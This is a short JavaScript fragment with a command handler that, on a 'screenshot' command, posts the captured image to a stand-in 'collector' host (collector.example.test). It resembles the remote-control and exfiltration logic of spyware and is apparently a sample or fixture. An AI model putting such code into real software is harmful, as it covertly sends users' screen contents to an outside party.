const axios = require('axios');
function handle(command, image) {
  switch (command) {
    case "screenshot":
      axios.post('https://collector.example.test/upload', { image });
      break;
  }
}
